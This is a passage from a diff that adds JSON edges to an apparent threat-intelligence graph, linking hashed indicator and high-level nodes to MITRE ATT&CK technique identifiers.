+      "node_v": "TTP_T1036",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_d0e2f0fb242b",
+      "node_u": "HL_44eca055532d",
+      "node_v": "TTP_T1586",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_f099790e59fd",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1132",
+      "edge_type": "high_level-ttp"
+    },
+    {
+      "edge_id": "EDGE_fbebc51b9d97",
+      "node_u": "IOC_3a2f2f0c18c2",
+      "node_v": "TTP_T1586",
+      "edge_type": "ioc-ttp"
+    }
+  ]
+}
